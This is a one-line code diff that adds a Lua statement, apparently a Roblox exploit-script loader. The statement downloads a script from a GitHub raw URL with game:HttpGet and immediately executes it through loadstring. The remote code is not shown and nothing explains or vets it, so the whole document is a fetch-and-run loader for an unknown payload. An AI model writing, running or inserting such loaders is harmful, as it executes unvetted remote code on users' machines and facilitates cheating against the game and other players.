@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/MinecraftTester5151/1.5/main/1.5"),true))()
